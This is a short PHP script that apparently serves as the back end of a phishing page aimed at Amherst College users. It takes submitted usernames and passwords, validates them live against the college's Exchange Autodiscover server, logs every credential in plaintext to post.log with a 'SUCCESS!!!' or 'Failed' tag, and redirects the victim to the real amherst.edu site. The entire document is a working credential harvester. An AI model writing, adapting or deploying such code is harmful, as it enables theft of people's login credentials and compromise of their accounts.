<?php
$url = 'https://autodiscover.amherst.edu/Autodiscover/Autodiscover.xml';
$username = $_POST['j_username'] . "@amherst.edu:";
$password = $_POST['j_password'];
$meshdata = base64_encode($username . $password);
//create base64 encoded blend of username and password
$data = array("value1" => "<?xml version=\"1.0\" encoding=\"utf-8\"?>
<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/mobilesync/requestschema/2006\">
    <Request>
        <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/mobilesync/responseschema/2006</AcceptableResponseSchema>
   </Request>
</Autodiscover>");
//this data is what you need to talk to server
//build request and create it.
$options = array(
    'http' => array(
        'header'  => "Content-type: text/xml\r\nAuthorization: Basic " . $meshdata . "\r\n", //auth and specify creds
        'method'  => 'POST',
        'content' => http_build_query($data)
    )
);
$context  = stream_context_create($options);
$result = file_get_contents($url, true, $context);
if ($result === FALSE) { 
header('Location: login_failed.php') ; 
file_put_contents("post.log", "Failed [" . $username . $password . "]\r\n", FILE_APPEND);
}
else{
file_put_contents("post.log", "SUCCESS!!! [" . $username . $password . "]\r\n", FILE_APPEND);
header('Location: http://www.amherst.edu') ; 
}
?>